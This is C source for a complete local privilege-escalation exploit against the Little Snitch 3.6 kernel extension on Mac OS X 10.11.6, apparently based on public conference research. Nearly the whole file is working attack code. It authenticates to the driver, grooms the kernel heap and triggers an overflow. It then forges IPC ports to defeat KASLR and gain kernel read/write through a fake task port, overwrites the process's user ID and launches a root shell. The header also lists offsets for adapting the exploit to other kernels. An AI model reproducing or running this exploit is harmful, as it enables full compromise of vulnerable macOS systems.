/*
 * $ sw_vers
 * ProductName:    Mac OS X
 * ProductVersion: 10.11.6
 * BuildVersion:   15G31

 * Little Snitch 3.6 (4352)

Offsets to change for a different kernel (up to 10.12.x):
 - 0x318 -> pid_for_task
 - 0x60 -> port->ip_kobject (_iokit_lookup_object_port)
 - 0x240 -> task->itk_bootstrap

References:
 - https://speakerdeck.com/patrickwardle/o-kit-drivers
 - https://media.defcon.org/DEF CON 24/DEF CON 24 presentations/DEFCON-24-Patrick-Wardle-99-Problems-Little-Snitch.pdf
 - https://www.youtube.com/watch?v=sRcHt-sxcPI (DEF CON 24 - Patrick Wardle - Ive got 99 Problems, but LittleSnitch aint one)
 - https://www.youtube.com/watch?v=KCFZxyFNao8 (eko 12 - 2016 - Patrick Wardle - Strolling into Ring-0 via I/O Kit Drivers)

$ ./exploit
[i] fake_ipc_port: 0x10daab000
[i] start page: 0x10dab3000
[i] guard page: 0x10dab4000
[i] payload address: 0x10dab3ef8
[i] Found fake_ipc_port: 0x33503
[+] leaked_ptr: 0xffffff800f850000
[+] Found kernel text: 0xffffff800f000000
[+] KASLR slide: 0x0000000ee00000
[i] Found kern_proc: ffffff800f920c70
[i] tfp0: 0x33603
[+] Got root!
*/

#define SALT "\x56\xe2\x76\xa7\xfa\x35\x5c\xfc\x23\x4b\x4f\x4c\xa3\x3f\x6a\x8e"

#include <stdio.h>          // printf
#include <stdlib.h>         // uint64_t
#include <mach/mach.h>      // kern_return_t
#include <mach/mach_vm.h>   // mach_vm_allocate
#include <unistd.h>         // getuid
#include <net/if.h>         // struct if_clonereq
#include <sys/ioctl.h>      // SIOCIFGCLONERS
#include <sys/mman.h>       // PROT_READ, PROT_WRITE, MAP_PRIVAT, MAP_ANON
#include <assert.h>         // assert

#include <IOKit/IOKitLib.h> // kIOMasterPortDefault
#include <CommonCrypto/CommonDigest.h> // CC_MD5_DIGEST_LENGTH

#include "librop.h"

/* 10.12/xnu-3789.1.32/osfmk/mach/task_special_ports.h */
#define TASK_BOOTSTRAP_PORT 4   /* Bootstrap environment for task. */

/* 10.12/xnu-3789.1.32/osfmk/ipc/ipc_object.h */
#define IO_BITS_ACTIVE      0x80000000  /* is object alive? */

/* 10.12/xnu-3789.1.32/osfmk/kern/ipc_kobject.h */
#define IKOT_TASK               2
#define IKOT_CLOCK              25

#define EXIT_ON_MACH_ERROR(msg, retval) \
  if (kr != KERN_SUCCESS) { \
    mach_error(msg ":" , kr); \
    exit((retval)); \
  }

#define LS_Service "at_obdev_LSNKE"

#define kr32(address, value) \
    *(uint64_t*) (fake_task + 0x318) = address - 0x10; \
    pid_for_task(found_port, value);

typedef struct
{
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t desc[1];
    char pad[4096];
} oolmsg_t;

struct ipc_object
{
    natural_t io_bits;
    natural_t io_references;
    char      io_lock_data[0x100];
};

mach_port_t tfp0 = 0;

void
copyin(void *to, uint64_t from, size_t size)
{
    mach_vm_size_t outsize = size;
    size_t szt = size;
    if (size > 0x1000)
    {
        size = 0x1000;
    }
    size_t off = 0;
    while (1)
    {
        mach_vm_read_overwrite(tfp0, off + from, size, (mach_vm_offset_t)(off + to), &outsize);
        szt -= size;
        off += size;
        if (szt == 0)
        {
            break;
        }
        size = szt;
        if (size > 0x1000)
        {
            size = 0x1000;
        }

    }
}

void
copyout(uint64_t to, void *from, size_t size)
{
    mach_vm_write(tfp0, to, (vm_offset_t)from, (mach_msg_type_number_t)size);
}

uint64_t
ReadAnywhere64(uint64_t addr)
{
    uint64_t val = 0;
    copyin(&val, addr, 8);
    return val;
}

uint64_t
WriteAnywhere64(uint64_t addr, uint64_t val)
{
    copyout(addr, &val, 8);
    return val;
}

uint32_t
ReadAnywhere32(uint64_t addr)
{
    uint32_t val = 0;
    copyin(&val, addr, 4);
    return val;
}

uint64_t
WriteAnywhere32(uint64_t addr, uint32_t val)
{
    copyout(addr, &val, 4);
    return val;
}

void
connect_to_ls(io_connect_t *connect)
{
    kern_return_t kr        = 0;
    io_service_t  service   = 0;
    io_iterator_t iterator  = 0;
    IOServiceGetMatchingServices(kIOMasterPortDefault,
                                 IOServiceMatching(LS_Service),
                                 &iterator);
    service = IOIteratorNext(iterator);

    /* Connect to the service, type = 0x7789, 0x7790, 0x7791 */
    kr = IOServiceOpen(service, mach_task_self(), 0x7789 /*Type*/, connect);
    EXIT_ON_MACH_ERROR("IOServiceOpen", kr);
}

void
authenticate_to_ls(io_connect_t *connect)
{
    kern_return_t kr        = 0;
    char outputStruct[16]   = {0};
    size_t outputStructCnt  = 16;

    unsigned char buffer[32];
    unsigned char digest[CC_MD5_DIGEST_LENGTH];

    /* Fetch the random values */
    kr = IOConnectCallStructMethod(*connect,
                                   4 /* IOMethod selector, get_random_bytes*/,
                                   0,
                                   0,
                                   outputStruct, // output
                                   &outputStructCnt); // output cnt
    EXIT_ON_MACH_ERROR("IOConnectCallScalarMethod(4)", kr);

    /* Send the md5(rand + salt) */
    memcpy(buffer, outputStruct, 16);
    memcpy(buffer + 16, SALT, 16);

    CC_MD5_CTX hashObject;
    CC_MD5_Init(&hashObject);
    CC_MD5_Update(&hashObject, (const void *)buffer, (CC_LONG) 32);
    CC_MD5_Final(digest, &hashObject);

    kr = IOConnectCallStructMethod(*connect,
                                   8 /* auth */,
                                   digest,
                                   16,
                                   0,
                                   0);
    EXIT_ON_MACH_ERROR("IOConnectCallScalarMethod(8)", kr);
}

void *
create_buffer_to_overflow(int kalloc_size, int overflow_length, uint8_t *overflow_data)
{

    void *start_memory = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    void *guard_memory = mmap(start_memory + PAGE_SIZE, PAGE_SIZE, PROT_NONE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0);

    printf("[i] start page: %p\n", start_memory);
    printf("[i] guard page: %p\n", guard_memory); /* Because we have only one page, not really needed */
    memset(start_memory, 0xEE, PAGE_SIZE);

    uint8_t *payload = (uint8_t *)start_memory + PAGE_SIZE - kalloc_size - overflow_length;
    printf("[i] payload address: %p\n", payload);
    memcpy(payload + kalloc_size, overflow_data, overflow_length);

    return payload;
}


int
main(int argc, char *argv[])
{
    kern_return_t kr        = 0;
    io_connect_t connect = MACH_PORT_NULL;

    kernel_map_t *km = map_file("/System/Library/Kernels/kernel");
    uint64_t kernel_base_without_slide = find_symbol_address(km, "__mh_execute_header");

    connect_to_ls(&connect);
    authenticate_to_ls(&connect);

    /* Environment preparation */
    mach_port_t *ports = calloc(800, sizeof(mach_port_t));
    for (int i = 0; i < 800; i++)
    {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
    }
    oolmsg_t msg1;
    memset(&msg1, 0, sizeof(oolmsg_t));
    oolmsg_t msg2;
    memset(&msg2, 0, sizeof(oolmsg_t));

    mach_port_t *buffer = calloc(0x1000, sizeof(mach_port_t));
    for (int i = 0; i < 0x1000; i++)
    {
        buffer[i] = MACH_PORT_DEAD;
    }

    msg1.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    msg1.header.msgh_local_port = MACH_PORT_NULL;
    msg1.header.msgh_size = sizeof(msg1) - 2048;
    msg1.body.msgh_descriptor_count = 1;
    msg1.desc[0].address = buffer;
    msg1.desc[0].count = 0x100 / 8; // (kalloc.256)
    msg1.desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg1.desc[0].disposition = MACH_MSG_TYPE_COPY_SEND;

    for (int i = 1; i < 800; i++)
    {
        msg1.header.msgh_remote_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.header, MACH_SEND_MSG, msg1.header.msgh_size, 0, 0, 0, 0);
        assert(kret == 0);
    }

    for (int i = 300; i < 500; i += 5)
    {
        msg2.header.msgh_local_port = ports[i];
        kern_return_t kret = mach_msg(&msg2.header, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
        assert(kret == 0);
    }

    for (int i = 300; i < 400; i += 5)
    {
        msg1.header.msgh_remote_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.header, MACH_SEND_MSG, msg1.header.msgh_size, 0, 0, 0, 0);
        assert(kret == 0);
    }

    /* Create the fake ipc port */
    struct ipc_object *fake_ipc_port = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    printf("[i] fake_ipc_port: %p\n", fake_ipc_port);
    fake_ipc_port->io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;
    fake_ipc_port->io_references = 0xff;

    /* Trigger the overflow */
    struct __attribute__((__packed__)) input_struct_t
    {
        void *address;
        size_t size;
        char padding[16];
    } input_struct;
    memset(&input_struct, 0, 32);
 
    int num_to_overflow = 8;
    int kalloc_size = 256;
    input_struct.size = 0x100000000 + 256; // kalloc.256 zone
    input_struct.address = create_buffer_to_overflow(kalloc_size, num_to_overflow, (uint8_t *) &fake_ipc_port);
    kr = IOConnectCallStructMethod(connect,
                                   7 /* vuln */,
                                   &input_struct,
                                   32, // 8+8
                                   0,
                                   0);
    EXIT_ON_MACH_ERROR("IOConnectCallScalarMethod(7)", kr);

    /* Find the port we overflowed */
    mach_port_t found_port = 0;
    for (int i = 300; i < 500; i++)
    {
        msg1.header.msgh_local_port = ports[i];
        kern_return_t kret = mach_msg(&msg1.header, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
        assert(kret == 0);

        mach_port_t *rcv_port = msg1.desc[0].address;
        if (*rcv_port != MACH_PORT_DEAD)
        {
            printf("[i] Found fake_ipc_port: 0x%x\n", *rcv_port);
            if (*rcv_port)
            {
                found_port = *rcv_port;
                goto found;
            }
        }
        mach_msg_destroy(&msg1.header);
        mach_port_deallocate(mach_task_self(), ports[i]);
        ports[i] = 0;
    }
    printf("[-] Can't find overflow port.\n");
    exit(1);

found:
    ;

    for (int i = 0; i < 0x300; i++)
    {
        for (int k = 0; k < 0x40000 * 5; k += 8)
        {

            *(uint64_t *)(((uint64_t)fake_ipc_port) + 0x60) = kernel_base_without_slide + i * 0x100000 + k; // ip_kobject
            fake_ipc_port->io_references = 0xff;

            kern_return_t kret = clock_sleep_trap(found_port, 0, 0, 0, 0);

            if (kret != KERN_FAILURE)
            {
                goto gotclock;
            }
        }
    }
    printf("[-] Can't find clock task.\n");
    exit(1);


    /* Found clock task */
gotclock:
    ;
    uint64_t leaked_ptr =  *(uint64_t *)(((uint64_t)fake_ipc_port) + 0x60);
    leaked_ptr &= ~0x3FFF;

    printf("[+] leaked_ptr: 0x%llx\n", leaked_ptr);

    /* Change our structure to ikot_task */
    fake_ipc_port->io_bits = IKOT_TASK | IO_BITS_ACTIVE;
    fake_ipc_port->io_references = 0xff;
    char *fake_task = malloc(0x1000);

    *(uint64_t *)(((uint64_t)fake_ipc_port) + 0x60) = (uint64_t) fake_task; /* ip_kobject */
    *(uint64_t *)(((uint64_t)fake_ipc_port) + 0xa0) = 0xff; /* ref_count */
    *(uint64_t *) (fake_task + 0x10) = 0xff; /* task->ref_count */

    while (leaked_ptr > kernel_base_without_slide)
    {
        int32_t leaked = 0;
        kr32(leaked_ptr, &leaked);
        if (leaked == MH_MAGIC_64)
        {
            printf("[+] Found kernel text: 0x%llx\n", leaked_ptr);
            break;
        }
        leaked_ptr -= 0x4000;
    }

    uint64_t kernel_base = leaked_ptr;
    uint64_t kslide = kernel_base - kernel_base_without_slide;
    printf("[+] KASLR slide: %#016llx\n", kslide);


    uint64_t allproc = find_symbol_address(km, "_allproc") + kslide;

    uint64_t proc_ = allproc;
    uint64_t myproc = 0;
    uint64_t kern_proc = 0;

    /* Iterate until we find pid 0 */
    while (proc_)
    {
        uint64_t proc = 0;

        kr32(proc_, (int32_t *)&proc);
        kr32(proc_ + 4, (int32_t *)(((uint64_t)(&proc)) + 4));

        int pd = 0;

        kr32(proc + 0x10, (int32_t *)&pd);

        if (pd == getpid())
        {
            myproc = proc;
        }
        else if (pd == 0)
        {
            kern_proc = proc;
        }
        proc_ = proc;
    }
    printf("[i] Found kern_proc: %llx\n", kern_proc);

    uint64_t kern_task = 0;
    kr32(kern_proc + 0x18, (int32_t *)&kern_task); // proc->task
    kr32(kern_proc + 0x18 + 4 , (int32_t *)(((uint64_t)(&kern_task)) + 4));

    uint64_t itk_kern_sself = 0;
    kr32(kern_task + 0xe8, (int32_t *)&itk_kern_sself); // task->itk_sself
    kr32(kern_task + 0xe8 + 4 , (int32_t *)(((uint64_t)(&itk_kern_sself)) + 4));

    char *ktaskdump = malloc(0x1000);
    char *fake_taskport = malloc(0x1000);

    for (int i = 0; i < 0x1000 / 4; i++)
    {
        kr32(kern_task + i * 4, (int32_t *)(&ktaskdump[i * 4]));
    }

    for (int i = 0; i < 0x1000 / 4; i++)
    {
        kr32(itk_kern_sself + i * 4, (int32_t *)(&fake_taskport[i * 4]));
    }

    /* Dump kernel task port */
    memcpy(fake_task, ktaskdump, 0x1000);
    memcpy(fake_ipc_port, fake_taskport, 0x1000);

    *(uint64_t *)(((uint64_t)fake_ipc_port) + 0x60) = (uint64_t) fake_task; /* ip_kobject */
    *(uint64_t *)(((uint64_t)fake_task) + 0x248) = itk_kern_sself; // task->itk_bootstrap

    /* Get kernel task */
    task_get_special_port(found_port, TASK_BOOTSTRAP_PORT, &tfp0);
    printf("[i] tfp0: 0x%x\n", tfp0);
    fake_ipc_port->io_bits = 0;

    /* Escalate to root */
    uint64_t ucred = ReadAnywhere64(myproc + 0xe8); // proc->ucred
    WriteAnywhere64(ucred + 0x18, 0); // ucred->cr_uid

    if (getuid() == 0)
    {
        puts("[+] Got root!");
        system("/bin/bash");
    }

    /* If we are here, exploit failed */
    return 0;

    IOConnectRelease(connect);
}
